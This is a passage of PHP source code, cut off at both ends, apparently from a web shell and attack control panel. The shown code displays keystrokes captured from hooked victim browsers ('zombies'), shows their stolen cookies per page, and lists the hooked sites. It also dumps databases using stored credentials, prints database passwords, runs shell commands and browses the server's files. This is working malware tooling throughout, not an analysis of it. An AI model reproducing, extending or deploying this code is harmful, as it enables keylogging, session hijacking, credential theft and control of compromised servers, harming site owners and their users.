        $output .= "<textarea rows=17 cols=110>" . 
        $this->get_zombie_ping_result ($_POST['id']) . "</textarea>";
      }

      // Read keylogger information
      if (!$this->is_ajax_request () ||
          $_POST['div'] == 'id_kl')
      {
        if (!$this->is_ajax_request ())
        {
          $output .= "<div id=id_kl style=\"display:none;\">";
        }

        $output .= "
          <table width=850><caption>Keylogger</caption>
          <tr><td colspan=2 align=center>Scroll at the end to see the new catches&nbsp;!</td></tr>
          <tr><td><textarea rows=18 cols=100>";

        if ($data = $this->fix_magic_quotes ($this->read_file ($kl_file)))
        {
          $kl_chars = array ();
          $arr = array ();
          $i = 0;
          $i_real = 0;
          $j_real = 0;

          // Reorganize keys respecting sequence order
          foreach (explode ("\n", $data) as $line)
          {
            if (!trim ($line))
            {
              continue;
            }

            $c = explode ('-', $line, 2);
            $arr[$c[0]] = $c[1];
          }

          $last_c = '';
          for ($j = 0; $j_real < count ($arr); $j++)
          {
            if (!isset ($arr[$j]))
            {
              continue;
            }

            $j_real++;
            $c = explode ('-', $arr[$j]);

            // TODO Manage other special keys
            if ($c[1] == 'S')
            {
              switch ($c[0])
              {
                // Backspace
                case 8:
                  unset ($kl_chars[--$i]); 
                  --$i_real;
                  break;

                // End
                case 35:
                  $i = $i_real;
                  break;

                // Home
                case 36:
                  $i = 0;
                  break;

                // Left arrow
                case 37:
                  --$i;
                  break;

                // Left arrow
                case 39:
                  ++$i;
                  break;

                // Delete
                case 46:
                  array_splice ($kl_chars, $i, 1); 
                  --$i_real;
                  break;
              }
            }
            // User moved to another domain, so we can not follow it
            elseif ($c[0] == 666)
            {
              $this->build_kl_internal_message ($kl_chars, $i, 
                'ZOMBIE HAS GONE AWAY TO ANOTHER DOMAIN!');
            }
            // FIXME Add UTF-8 support
            else
            {
              if (!($last_c == 13 && $c[0] == 13))
              {
                if ($i == $i_real)
                {
                  $kl_chars[$i++] = chr ($c[0]);
                }
                else
                {
                  array_splice ($kl_chars, $i++, 0, chr ($c[0]));
                }
              }

              $last_c = $c[0];

              $i_real++;
            }
          }

          $output .= implode ('', $kl_chars);
        }

        $output .= "
          </textarea></td><td width=55><input type=button 
          onclick=\"action_type.value='" . ACTION_MENU_ZOMBIE_KL_RESET . 
          "';page_menu_display.value='id_kl';_submit();\" value='Reset'>
          </td></tr></table>";

        if (!$this->is_ajax_request ())
        {
          $output .= "</div>";
        }
      }

      // Read cookies information
      if (!$this->is_ajax_request () || $_POST['div'] == 'id_ck')
      {
        if (!$this->is_ajax_request ())
        {
          $output .= "<div id=id_ck style=\"display:none;\">";
        }

        $output .=  "
          <table width=850><caption>Cookies</caption>
          <tr><td width=795>&nbsp;</td><td>&nbsp;</td>
          <td width=55><input type=button onclick=\"action_type.value='" .
          ACTION_MENU_ZOMBIE_CK_RESET . 
          "';page_menu_display.value='id_ck';_submit();\" value='Reset'>
          </td></tr>";

        if ($data = $this->fix_magic_quotes ($this->read_file ($ck_file)))
        {
          $h = array ();
          foreach (explode ("\n", $data) as $line)
          {
            if (!trim ($line))
            {
              continue;
            }

            $c = explode ('|~|', $line);

            $key = $c[1].$c[2];
            if (isset ($h[$key]))
            {
              continue;
            }
            $h[$key] = 1;

            $output .= "
              <tr><td class=label nowrap>Capture time&nbsp;:</td>
              <td>".$this->htmlentities ($c[0])."</td>
              <td>&nbsp;</td></tr><tr><td class=label>Page&nbsp;:</td>
              <td>".$this->htmlentities ($c[1])."</td>
              <td>&nbsp;</td></tr><tr><td class=label>Content&nbsp;:</td>
              <td><textarea rows=15 cols=89>";

            foreach (explode (';', $c[2]) as $items)
            {
              $c1 = explode ('=', $items, 2);
              $output .= '* '.$c1[0].' : '.$c1[1]."\n";
            }

            $output .= "</textarea>";
          }

          $output .= "</td><td>&nbsp;</td></tr>";
        }
        else
        {
          $output .= "<tr><td colspan=3 align=center>Nothing yet...</td></tr>";
        }

        $output .= "</table>";

        if (!$this->is_ajax_request ())
        {
          $output .= "</div>";
        }
      }

      return $output;
    }

    function get_zombie_kl_next_seq_number ($id = '')
    {
      if (!$id)
      {
        $id = $this->get_zombie_id_from_referer ();
      }

      if (!$id || 
          !($data = $this->read_file ($this->get_base_tmpdir().'/.z_kl_'.$id)))
      {
        return 0;
      }

      return count (explode ("\n", $data)) - 1;
    }

    function get_zombies_list_html ()
    {
      $output = $this->get_zombies_timers_html ();

      if (!($dir =  $this->get_base_tmpdir ()) ||
          !($dir_content = $this->get_dir_content ($dir)) ||
          !preg_match_all ('/(\.z_[a-z]+_(.*))/', $dir_content, $m))
      {
        return "$output<p style='color:gray;text-align:center'>No zombie contact for the moment...</p>";
      }

      $output .= "
        <p><table style='margin:auto'><caption>Zombies list</caption>
        <tr class=header><th>Location</th><th>Action</th></tr>";

      sort ($m[2]);
      $prev = '';
      foreach ($m[2] as $item)
      {
        if ($prev != $item)
        {
          $url = $this->get_zombie_location_by_name ($item);
          $output .= "
            <tr><td><a target=\"_BLANK\" href=\"$url\">$url</a></td>
            <td><input type=button value='V' title=\"View local zombie data\" 
            onclick=\"zombie_id.value='$item';action_type.value='" . 
            ACTION_MENU_ZOMBIE_EDIT . "';_submit()\">
            <input type=button value='D' title=\"Delete local zombie data\" 
            onclick=\"zombie_id.value='$item';action_type.value='" . 
            ACTION_MENU_ZOMBIE_DELETE . "';_submit()\"></td></tr>";

          $prev = $item;
        }
      }

      $output .= '</table>';

      return $output;
    }

    function get_zombie_location_by_name ($name)
    {
      $infos = explode ('|', base64_decode ($name));

      $scheme = $infos[0];
      $host = $infos[1];
      $port = (count ($infos) == 4) ? ':'.$infos[2] : '';
      $path = (count ($infos) == 4) ? $infos[3] : $infos[2];

      return "$scheme://$host$port$path";
    }

    function is_binary ($v)
    {
      if ($this->php_function_enabled ('is_binary'))
      {
        return is_binary ($v);
      }

      $t = substr ($v, 0, 10);
      $t = str_replace (array (chr (10), chr (13)), '', $t);

      return (!ctype_print ($t));
    }

    function ldap_array2ldif ($a)
    {
      $res = '';
     
      for ($i = 0; $i < count ($a); $i++)
      {
        $e = $a[$i]['dn'];
        $res .= '# '.ldap_dn2ufn($e)."\n";
        $res .= (strlen ($e) != strlen (utf8_decode($e))) ?
          'dn:: '.base64_encode($e)."\n" : "dn: $e\n";

        unset ($a[$i]['dn']);

        foreach ($a[$i] as $k => $v)
        {
          if (!is_array ($v))
          {
            $v = array ($v);
          }

          for ($j = 0; $j < count ($v); $j++)
          {
            $e = $v[$j];
            $res .= (strlen ($e) != strlen (utf8_decode($e))) ?
              "$k:: ".base64_encode ($e)."\n" : "$k: $e\n";
          }
        }

        $res .= "\n";
      }

      return $res;
    }

    function ldap_ldif2array ($ldif)
    {
      $res = array ();
      $a = preg_split ("/\n\s*\n/", $ldif);
     
      for ($i = 0; $i < count ($a); $i++)
      {
        if (!$a[$i])
        {
          continue;
        }

        $tmp = array ();
        $b = explode ("\n", $a[$i]);
        for ($j = 0; $j < count ($b); $j++)
        {
          if (!($v = $b[$j]))
          {
            continue;
          }

          if (!preg_match ('/^\s*#/', $v))
          {
            list ($key, $value) = explode (':', $v, 2);
            $b64 = (preg_match ('/^\w+:: /', $v));

            if ($b64)
            {
              $value = base64_decode (preg_replace ('/^: /', '', $value));
            }

            $value = $this->utf8_encode (trim ($value));

            if (isset ($tmp[$key]))
            {
              if (!is_array ($tmp[$key]))
              {
                $tmp[$key] = array ($tmp[$key]);
              }

              $tmp[$key][] = $value;
            }
            else
            {
              $tmp[$key] = $value;
            }
          }
        }

        if (count ($tmp))
        {
          $res[] = $tmp;
        }
      }

      return $res;
    }

    function sql_send_dump ()
    {
      $ext = 'sql';
      $type = $this->vars['sql_type'];
      $table = $this->vars['sql_current_table'];
      $db = $this->vars[$type.'s'][$this->vars['sql_current']];

      switch ($type)
      {
        case SQL_POSTGRESQL:
          $tmpdir = $this->get_base_tmpdir ();
          $this->write_file ("$tmpdir/.pgpass", 
            $db['server'].':'.$db['port'].':'.$db['database'].':'.
            $db['login'].':'.$db['password'], 'w');
          chmod ("$tmpdir/.pgpass", 0600);
          $cmd = 'pg_dump -h'.$db['server'].' -p'.$db['port'].' '.
                 $db['database'].(($table) ? " --table $table " : '').
                 ' -U'.$db['login'];
          $output = $this->execute_command_safe ($cmd, 
            array ('PGPASSFILE' => "$tmpdir/.pgpass"));
          unlink ("$tmpdir/.pgpass");
          break;

        case SQL_LDAP:
          $ext = 'ldif';
          $base = ($table) ? $table : $db['database'];
          $this->vars['sql_info_2'] = array ('*');
          $res = $this->sql_query ("(objectclass=*)", 
                                    array ('base_dn' => $base));
          $output = 
            "# extended LDIF\n#\n".
            "# LDAPv3\n".
            "# base <$base> with scope subtree\n".
            "# filter: (objectclass=*)\n".
            "# requesting: ALL\n".
            "#\n\n";
          $output .= $this->ldap_array2ldif ($res);
          break;

        case SQL_MYSQL:
          $cmd = 'mysqldump -h'.$db['server'].' -P'.$db['port'].' '.
                 $db['database'].(($table) ? " --tables $table " : '').
                 ' -u'.$db['login'].' -p'.$db['password'];
          $output = $this->execute_command_safe ($cmd);
          break;

        default: echo __FILE__.':'.__LINE__; exit;
      }

      $table = preg_replace ('/[^a-z\,\-=]/i', '-', $table);
      $this->send_file ($type.'_'.$this->vars['sql_current'].(($table) ? 
        "_$table" : '')."_dump.$ext", $output);
      exit (0);
    }

    function sql_query_pdo ($type, $db, $sql = '')
    {
      $type = ($type == SQL_POSTGRESQL) ? 'pgsql' : 'mysql';
      $res = 0;

      try
      {
        $c = new PDO ("$type:host=".$db['server'].';'.
                      'port='.$db['port'].';'.
                      'dbname='.$db['database'],
                      $db['login'], $db['password']);
        $c->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $res = 1;

        if ($sql)
        {
          $res = array ();
          $st = $c->prepare ($sql);
          $st->execute ();

          if ($st->rowCount ())
          {
            $res = $st->fetchAll (PDO::FETCH_ASSOC);
          }
          else
          {
            $res = 'Execution OK';
          }

          $st->closeCursor ();
        }

        $c = null;
      }
      catch(Exception $e)
      {
        $this->vars['sql_error'] = $e->getMessage().' !';
      }

      return $res;
    }


    function sql_query ($sql = '', $args = array ())
    {
      $res = 0;
      $type = $this->vars['sql_type'];
      $db = $this->vars["{$type}s"][$this->vars['sql_current']];

      switch ($type)
      {
        case SQL_POSTGRESQL:

          // PDO pgsql
          if (extension_loaded ('pdo_pgsql'))
          {
            $res = $this->sql_query_pdo ($type, $db, $sql);
          }
          else
          {
            $c = pg_pconnect (
              ' host='.$db['server'].
              ' port='.$db['port'].
              (($db['login']) ? ' user='.$db['login']:'').
              (($db['password']) ? ' password='.$db['password']:'').
              ' dbname='.$db['database']);
            if (is_resource ($c))
            {
              $res = 1;
  
              if ($sql)
              {
                if (($r = pg_query ($sql)))
                {
                  $res = pg_fetch_all ($r);
                }
                elseif ($err = pg_last_error ())
                {
                  $this->vars['sql_error'] = "$err !";
                }
                else
                {
                  $res = 'Execution OK';
                }
              }
            }
          }
          break;

        case SQL_MYSQL:
       
          // PDO mysql
          if (extension_loaded ('pdo_mysql'))
          {
            $res = $this->sql_query_pdo ($type, $db, $sql);
          }
          // mysqli_connect
          elseif ($this->php_function_enabled ('mysqli_connect'))
          {
            if ($c = mysqli_connect ($db['server'], $db['login'],
                                     $db['password'], $db['database'],
                                     $db['port']))
            {
              $res = 1;

              if ($sql)
              {
                if (($r = mysqli_query ($c, $sql)))
                {
                  $res = mysqli_fetch_all ($r, MYSQLI_ASSOC);
                }
                elseif ($err = mysqli_error ($c))
                {
                  $this->vars['sql_error'] = "$err !";
                }
                else
                {
                  $res = 'Execution OK';
                }
              }

              mysqli_close ($c);
            }
          }
          // mysql_connect
          elseif ($this->php_function_enabled ('mysql_connect'))
          {
            $c = mysql_connect ($db['server'].':'.$db['port'],
                                $db['login'], $db['password']);
            if (is_resource ($c) && mysql_select_db ($db['database']))
            {
              $res = 1;
  
              if ($sql)
              {
                if (($r = mysql_query ($sql)) && is_resource ($r))
                {
                  $res = array ();
                  while ($row = mysql_fetch_array ($r, MYSQL_ASSOC))
                  {
                    $res[] = $row;
                  }
                }
                elseif ($err = mysql_error ())
                {
                  $this->vars['sql_error'] = "$err !";
                }
                else
                {
                  $res = 'Execution OK';
                }
              }

              mysql_close ($c);
            }
          }

          break;

        case SQL_LDAP:
          $c = ldap_connect ($db['server'], $db['port']);
          if ($c)
          {
            ldap_set_option ($c, LDAP_OPT_PROTOCOL_VERSION, 3);

            $rb = ($db['login']) ?
              ldap_bind ($c, $db['login'], $db['password']) :
              ldap_bind ($c);

            $res = 1;

            // Write operation
            if ($sql && $rb && $this->vars['ldap_rw'] == 'w')
            {
              $info = $this->ldap_ldif2array ($sql);

              if (!isset ($info[0]['dn']))
              {
                $this->vars['sql_error'] = "Bad LDIF content!";
                break;
              }

              for ($i = 0; $i < count ($info); $i++)
              {
                $dn = trim ($info[$i]['dn']);unset ($info[$i]['dn']);

                switch ($this->vars['ldap_rw_action'])
                {
                  case 'ADD':
                    $r = ldap_add ($c, $dn, $info[$i]); break;
                  case 'MODIFY':
                    $r = ldap_modify ($c, $dn, $info[$i]); break;
                    break;
                  case 'DELETE':
                    $r = ldap_delete ($c, $dn); break;
                    break;

                  default: echo __FILE__.':'.__LINE__; exit;
                }

                if (!$r)
                {
                  $this->vars['sql_error'] .= "$dn: ".ldap_error ($c)."!\n";
                }
              }

              if (!$this->vars['sql_error'])
              {
                $res = 'Execution OK';
              }

              $sql = '';
            }

            // Read operation
            $dump = (isset ($args['base_dn']));
            $base = ($dump) ? $args['base_dn'] : $db['database'];
            if ($sql && $rb && 
                ($r = ldap_search ($c, $this->utf8_encode ($base), $sql, 
                                    $this->vars['sql_info_2'])) && $r)
            {
              $res = array ();
              $headers = array ();

              // Retreive all headers labels
              for ($i = ldap_first_entry ($c, $r);
                   $i && $arr = ldap_get_attributes ($c, $i);
                   $i = ldap_next_entry ($c, $i))
              {
                for ($k = 0; $k < $arr['count']; $k++)
                {
                  $headers[$arr[$k]] = array ();
                }
              }

              // Build array for result display
              for ($i = ldap_first_entry ($c, $r);
                   $i && $arr = ldap_get_attributes ($c, $i);
                   $i = ldap_next_entry ($c, $i))
              {
                $h = $headers;
                $h['dn'] = ldap_get_dn ($c, $i);
                for ($k = 0; $k < $arr['count']; $k++)
                {
                  $n = $arr[$k];
                  for ($l = 0; $l < $arr[$n]['count']; $l++)
                  {
                    // To avoid to display garbage...
                    if (!$dump && $this->is_binary ($arr[$n][$l]) 
                        && strlen ($arr[$n][$l]) > 255)
                    {
                      $h[$n][] = '[Binary object]';
                    }
                    else
                    {
                      $h[$n][] = $arr[$n][$l];
                    }
                  }
                }
                $res[] = $h;
              }
            }
            elseif ($sql && ldap_error ($c))
            {
              $this->vars['sql_error'] = ldap_error ($c).'!';
            }
            elseif ($sql)
            {
              $res = 'Oops, bug?';
            }
          }
          break;      

        default: echo __FILE__.':'.__LINE__; exit;
      }

      return $res;
    }

    function sql_connection_test ()
    {
      return ($this->sql_query ());
    }

    function sql_table_headers_html ($headers, $type, $table_list)
    {
      $output = '<tr>';

      if ($table_list)
      {
        $output .= "<th>Action</th>";
      }

      if ($type == SQL_LDAP)
      {
        $output .= '<th>dn</th>';
        unset ($headers['dn']);
      }

      foreach ($headers as $k => $v)
      {
        $output .= "<th>$k</th>";
      }

      $output .= '</tr>';

      return $output;
    }

    function display_sql_result_html ()
    {
      $type = $this->vars['sql_type'];
      $db = $this->vars[$type.'s'][$this->vars['sql_current']];
      $table_list = 
        (preg_match ('/show\s+tables/', 
                     $this->vars['sql_command_current']) ||
        $this->vars['sql_command_current'] == '\\dt' ||
        $type == SQL_LDAP);
      $res = $this->vars['sql_command_current_output'];
      sort ($res);

      $row_color = '';
      echo "<p><div style=\"clear:both;\"><table class=sql_result>";

      echo $this->sql_table_headers_html ($res[0], $type, $table_list);

      foreach ($res as $k => $row)
      {
      	$row_color = ($row_color == 'odd') ? 'even' : 'odd';
        echo "<tr class=$row_color>";

        if ($table_list) 
        {
          $r = array_values ($row);
          $id = ($type == SQL_LDAP) ? $row['dn'] : $r[0];

          echo "
            <td><input type=button value='Dump' title=\"Dump `".
            addslashes($this->htmlentities($id)).
            "`\" onclick=\"sql_current_table.value='".
            addslashes($this->htmlentities($id))."';action_requested.value='".
            SHELL_SQL_DUMP_TABLE."';_submit()\"></td>";

          if ($type == SQL_LDAP)
          {
            echo '<td>'.$this->htmlentities ($id).'</td>';
            unset ($row['dn']);
          }
        }

        foreach ($row as $col => $v)
        {
          if (is_array ($v))
          {
            echo '<td>';
            if (count ($v))
            {
              foreach ($v as $v1)
              {
                echo $this->htmlentities ($v1).'<br>';
              }
            }
            else
            {
              echo '&nbsp;';
            }

            echo '</td>';
          }
          else
          {
            echo '<td>'.$this->htmlentities ($v).'</td>';
          }
        }

        echo "</tr>";
      }

      echo "</table></div>";
    }

    function display_database_properties_html ()
    {
      echo "<div style='float:left;margin-right:2em;padding-bottom:20px'>";

      $type = $this->vars['sql_type'];
      $db = $this->vars["{$type}s"][$this->vars['sql_current']];

      $login_lb = ($type == SQL_LDAP) ? 'Login (DN)' : 'Login';
      $database_lb = ($type == SQL_LDAP) ? 'Base DN' : 'Database';

      echo "
        <table><caption>Current database properties</caption>
        <tr class=header><th>Name</th><th>Value</th></tr>
        <tr><td class=label>$database_lb</td><td><b>".$db['database']."
        </b></td></tr>
        <tr><td class=label>Type</td><td>$type</td></tr>
        <tr><td class=label>Server</td><td>".$db['server']."</td></tr>
        <tr><td class=label>Port</td><td>".$db['port']."</td></tr>
        <tr><td class=label>$login_lb</td><td>".$db['login']."</td></tr>
        <tr><td class=label>Password</td><td>".$db['password']."</td></tr>
        </table>
        </div>";
    }

    function normalize_profiles ()
    {
      if (!count ($this->vars['profiles']))
      {
        $this->vars['profiles'] = $this->get_profiles ();
      }
    }

    function normalize_sql ()
    {
      foreach (array (SQL_POSTGRESQL,
                      SQL_MYSQL,
                      SQL_LDAP) as $type)
      {
        if (!count ($this->vars[$type.'s']))
        {
          $this->vars[$type.'s'] = $this->get_sql ($type);
        }
      }

      if ($this->vars['sql_type'] == SQL_LDAP)
      {
        // Query
        if (!$this->vars['ldap_query'])
        {
          $this->vars['ldap_query'] = '(objectclass=*)';
        }
        elseif (!preg_match ('/^\s*\(.*\)\s*$/', $this->vars['ldap_query']))
        {
          $this->vars['ldap_query'] = '('.$this->vars['ldap_query'].')';
        }

        // Attributes
        if (!is_array ($this->vars['sql_info_2']))
        {
          if (!$this->vars['sql_info_2'])
          {
            $this->vars['sql_info_2'] = '*';
          }

          $this->vars['sql_info_2'] = 
            preg_replace ('/\s+/', '', $this->vars['sql_info_2']);

          $this->vars['sql_info_2'] = explode (',', $this->vars['sql_info_2']);
        }

        // Action
        if (!$this->vars['ldap_rw'])
        {
          $this->vars['ldap_rw'] = 'r';
        }

        if (!$this->vars['ldap_rw_action'])
        {
          $this->vars['ldap_rw_action'] = 'ADD';
        }

        if ($this->vars['ldap_rw'] == 'r')
        {
          $this->vars['sql_command'] = $this->vars['ldap_query'];
        }
      }
    }

    function normalize_aliases ()
    {
      if (!count ($this->vars['aliases']))
      {
        $this->vars['aliases'] = array ('ls' => 'ls -al');
      }
    }

    function normalize_dir_current ()
    {
      $path = trim ($this->vars['dir_current']);
      if (empty ($path))
      {
        $path = $this->get_root_path ();
      }

      $path = preg_replace ("#^/\.\.$#", '', $path);
      if (preg_match ("#^(.*)/[^/]+/\.\.$#", $path, $sub))
      {
        $path = $sub[1];
      }

      $path = preg_replace ("#/\.$#", '', $path);

      $this->vars['dir_current'] = $path;
    }

    function normalize_path ($path)
    {
      return preg_replace (array('#/\./#', '#/+#'), array('/', '/'), $path);
    }

    function normalize_initpath ()
    {
      $path = trim ($this->vars['file_browser_initpath']);

      if (substr ($path, -1) != '/')
      {
        $path .= '/';
      }

      if ($path{0} != '/')
      {
        $path = "/$path";
      }

      $path = $this->normalize_path ($path);

      if (strpos ($path, '.') !== false || !is_dir ($path)) 
      {
        $path = $this->get_root_path ();
      }

      $this->vars['file_browser_initpath'] = $path;
    }

    // Thanks to C99 :-)
    function fmodeToString ($mode)
    {
      if     (($mode & 0xC000) === 0xC000) $type = 's';
      elseif (($mode & 0x4000) === 0x4000) $type = 'd';
      elseif (($mode & 0xA000) === 0xA000) $type = 'l';
      elseif (($mode & 0x8000) === 0x8000) $type = '-'; 
      elseif (($mode & 0x6000) === 0x6000) $type = 'b';
      elseif (($mode & 0x2000) === 0x2000) $type = 'c';
      elseif (($mode & 0x1000) === 0x1000) $type = 'p';
      else $type = '?';
      $u['r'] = ($mode & 00400) ? 'r' : '-'; 
      $u['w'] = ($mode & 00200) ? 'w' : '-'; 
      $u['x'] = ($mode & 00100) ? 'x' : '-'; 
      $g['r'] = ($mode & 00040) ? 'r' : '-'; 
      $g['w'] = ($mode & 00020) ? 'w' : '-'; 
      $g['x'] = ($mode & 00010) ? 'x' : '-'; 
      $o['r'] = ($mode & 00004) ? 'r' : '-'; 
      $o['w'] = ($mode & 00002) ? 'w' : '-'; 
      $o['x'] = ($mode & 00001) ? 'x' : '-'; 
      if ($mode & 0x800) $u['x'] = ($u['x'] == 'x') ? 's' : 'S';
      if ($mode & 0x400) $g['x'] = ($g['x'] == 'x') ? 's' : 'S';
      if ($mode & 0x200) $o['x'] = ($o['x'] == 'x') ? 't' : 'T';
      return $type.
             $u['r'].$u['w'].$u['x'].
             $g['r'].$g['w'].$g['x'].
             $o['r'].$o['w'].$o['x'];
    }

    function _get_glob_output ($dir, $retry = 0)
    {
      $output = '';
      $arr = array ();
      $arr_sort = array ();

      if (substr ($dir, -1) != '/')
      {
        $dir .= '/';
      }

      if ((!$d = glob ($dir . '{,.}*', GLOB_BRACE)) && !$retry)
      {
        return $this->_get_glob_output ($this->get_root_path (), ++$retry);
      }
      elseif ($retry > 2)
      {
        return '';
      }

      foreach ($d as $f)
      {
        $f = basename ($f);
        $p = "$dir$f";
        $p = preg_replace ('#/\.$#', '/', $p);

        if (preg_match ('#/\.\.$#/', $p))
        {
          $i = 0;
          while ($p && $i++ < 2)
          {
            $p = substr ($p, 0, strrpos ($p, '/'));
          }
          $p .= '/';
        }

        if (is_link ("$p"))
        {
          $s = lstat ("$p");
        }
        elseif (!($s = stat ("$p")))
        {
          $s = array ('uid' => 'X', 'gid' => 'X', 'mode' => 0, 
                      'mtime' => 0, 'size' => 'X');
        }

        $user = $s['uid']; 
        $group = $s['gid'];

        if ($this->php_function_enabled ('posix_getpwuid') && 
            ($p = posix_getpwuid ($user)))
        {
          $user = $p['name'];
        }

        if ($this->php_function_enabled ('posix_getgrgid') && 
            ($p = posix_getgrgid ($group)))
        {
          $group = $p['name'];
        }

        if ($f != '.' && $f != '..' && is_link ("$dir/$f"))
        {
          $f = $f . ' -> ' . readlink ("$dir/$f");
        }

        $line = $this->fmodeToString ($s['mode']) . " 00 $user $group ";
        $line .= $s['size'].' '. 
          (($s['mtime']) ? 
            strftime ("%Y-%m-%d %H:%M:%S", $s['mtime']) :
            'X X')." +0000 $f\n";
        $line = explode (' ', $line);
        $arr[] = $line;
        $arr_sort[] = $line[8];
      }
      closedir ($d);

      array_multisort ($arr, SORT_STRING, $arr_sort);
      foreach ($arr as $row)
      {
        $output .= implode (' ', $row) . "\n";
      }

      return $output;
    }

    function _get_opendir_output ($dir, $retry = 0)
    {
      $output = '';
      $arr = array ();
      $arr_sort = array ();

      if (substr ($dir, -1) != '/')
      {
        $dir .= '/';
      }

      if ((!$d = opendir ($dir)) && !$retry)
      {
        return $this->_get_opendir_output ($this->get_root_path (), ++$retry);
      }
      elseif ($retry > 2)
      {
        return '';
      }

      while (($f = readdir ($d)))
      {
        $line = '';
        $p = "$dir$f";
        $p = preg_replace ('#/\.$#', '/', $p);
        if (preg_match ('#/\.\.$#', $p))
        {
          $i = 0;
          while ($p && $i++ < 2)
          {
            $p = substr ($p, 0, strrpos ($p, '/'));
          }
          $p .= '/';
        }
        if (is_link ("$p"))
        {
          $s = lstat ("$p");
        }
        elseif (!($s = stat ("$p")))
        {
          $s = array ('uid' => 'X', 'gid' => 'X', 'mode' => 0, 
                      'mtime' => 0, 'size' => 'X');
        }

        $user = $s['uid']; 
        $group = $s['gid'];

        if ($this->php_function_enabled ('posix_getpwuid') && 
            ($p = posix_getpwuid ($user)))
        {
          $user = $p['name'];
        }

        if ($this->php_function_enabled ('posix_getgrgid') && 
            ($p = posix_getgrgid ($group)))
        {
          $group = $p['name'];
        }

        if ($f != '.' && $f != '..' && is_link ("$dir/$f"))
        {
          $f = $f . ' -> ' . readlink ("$dir/$f");
        }

        $line = $this->fmodeToString ($s['mode']) . " 00 $user $group ";
        $line .= $s['size'].' '. 
          (($s['mtime']) ? 
            strftime ("%Y-%m-%d %H:%M:%S", $s['mtime']) :
            'X X')." +0000 $f\n";
        $line = explode (' ', $line);
        $arr[] = $line;
        $arr_sort[] = $line[8];
      }
      closedir ($d);

      array_multisort ($arr, SORT_STRING, $arr_sort);
      foreach ($arr as $row)
      {
        $output .= implode(' ', $row)."\n";
      }

      return $output;
    }

    function is_display_file ($line)
    {
      if ($line[8] == '.' || $line[8] == '..')
        return 1;

      return 
        (
          $this->is_symlink ($line[0]) && !$this->vars['show_symlinks'] ||
          $this->is_directory ($line[0]) && !$this->vars['show_directories'] ||
          $this->is_hidden ($line[8]) && !$this->vars['show_hidden_files'] ||
          $this->is_normal ($line) && !$this->vars['show_files']
        ) ? 0 : 1;
    }

    function execute_command_safe ($cmd, $env = array ())
    {
      $output = '';
      $this->save_user_inputs ();
      $this->reset_user_inputs ();
      $this->vars['command_current'] = $cmd;
      $this->command_current_execute ($env);
      $output = 
        $this->fix_magic_quotes ($this->vars['command_current_output']);
      $this->restore_user_inputs ();

      return $output;
    }

    function is_php_script ($name)
    {
      return (preg_match ('/\.(php\d?|phtml)$/i', $name));
    }

    function get_execute_method_info_html ()
    {
      static $output = '';

      if (!$output)
      {
        if (!($output = $this->get_execute_function ()))
        {
          $output = '<span class=error>not available</span>';
        }
        else
        {
          $output = "<span class=info_value>$output</span>";
        }
      }

      return $output;
    }

    function get_browse_method_info_html ()
    {
      static $output = '';

      if (!$output)
      {
        // System command
        if ($this->check_shell_command ('ls'))
        {
          $output = '<span class=info_value>ls</span>';
        }
        // opendir/readdir
        elseif ($this->php_function_enabled ('opendir'))
        {
          $this->vars['use_opendir'] = 1;
          $output = "
            <span class=info_value>opendir</span>/" .
            "<span class=info_value>readdir</span>";
        }
        // glob
        elseif ($this->php_function_enabled ('glob'))
        {
          $this->vars['use_glob'] = 1;
          $output = '<span class=info_value>glob</span>';
        }
        else
        {
          $output = '<span class=error>not available</span>';
        }
      }

      return $output;
    }

    function get_first_open_basedir ()
    {
      return ($d = ini_get ('open_basedir')) ? explode (':', $d)[0] : '';
    }

    function get_dir_content ($dir, $retry = 0)
    {
      // 1/ Try to browse with opendir/readdir
      if ($this->vars['use_opendir'])
      {
        $this->vars['command_current_output'] =
          $this->_get_opendir_output ($dir);
      }
      // 2/ Try to browse with glob
      elseif ($this->vars['use_glob'])
      {
        $this->vars['command_current_output'] = $this->_get_glob_output ($dir);
      }
      // 3/ Try to browse with ls command system
      elseif (!$this->vars['use_opendir'] && !$this->vars['use_glob'])
      {
        $this->vars['command_current'] = 
          'ls -al --full-time '.$this->escapeshellarg($dir);

        $this->vars['command_current_output'] = '';

        $this->command_current_execute ();

        // Just in case ls system command were not found
        if (preg_match ('/ls\s*:\s*.*not\s+found/',
                        $this->vars['command_current_output']))
        {
          $this->vars['command_current_output'] = '';
        }

        if (!$this->vars['command_current_output'])
        {
           if ($this->php_function_enabled ('opendir'))
           {
             $this->vars['use_opendir'] = 1;
             return $this->get_dir_content ($dir, ++$retry);
           }
           elseif ($this->php_function_enabled ('glob'))
           {
             $this->vars['use_glob'] = 1;
             return $this->get_dir_content ($dir, ++$retry);
           }
        }
      }

      return $this->vars['command_current_output'];
    }

    function get_browse_dir ($retry = 0)
    {
      $can_save = 0;
      $can_write_some = 0;
      $can_upload = 0;
      $can_host_some = 0;
      $can_read = 1;
      $can_write = 1;
      $browse_path = '';

      // FILE
      if (is_file ($this->vars['dir_current']))
      {
        echo "<div style='margin:auto;width:800px'>";

        if (is_link ($this->vars['dir_current']))
        {
          $d = dirname ($this->vars['dir_current']);
          $this->vars['dir_current'] = readlink($this->vars['dir_current']);

          if ($this->vars['dir_current']{0} != '/')
          {
            $this->vars['dir_current'] =
              realpath ($d.'/'.$this->vars['dir_current']);
          }
        }

        $dir = $this->vars['dir_current'];
        $arr = explode (',', $this->vars['file_current_rights']);

        $can_read = is_readable ($dir);
        $can_write = is_writable ($dir);
        $can_write_some = $can_write;
        $can_host_some = $can_write && $this->is_php_script ($dir);

        list ($browse_path, $html) = $this->get_browse_path();
        echo "<p>$html";

        $tmp = $this->execute_command_safe (
                 'file -b -i '.$this->escapeshellarg($dir));
        if (!$tmp)
        {
          $tmp = $dir;
          $bad = (!preg_match (
          "/(php\d?|phtml|htm|html|pl|pm|xml|xsl|sh|py|java|" .
          "css|patch|diff|txt|js)$/i", $tmp));
        }
        else
        {
          $bad = (!preg_match ("/(image|text|ascii|php|html|perl|script)/i", 
                               $tmp));
        }

        $tmp = preg_replace ('/\s+$/', '', $tmp);

        $filename = basename ($dir);
        $filesize = filesize($dir).' byte(s)';

        if ((preg_match ('/(gif|jpe?g|png|bmp|ico)$/i', $dir) || 
             stripos ($tmp, 'image') !== false))
      	{
          printf ("
            <input type=hidden name='choice[]' value=\"%s\">
            <pre>%s</pre>
            <img src=\"data:%s;base64,%s\">", 
            $this->vars['dir_current'],
            "$filename $filesize",
            $this->get_mime_type($dir),
            base64_encode(file_get_contents ($dir)));
        }
        elseif ($bad && !$this->vars['force_view'])
        {
          printf ("
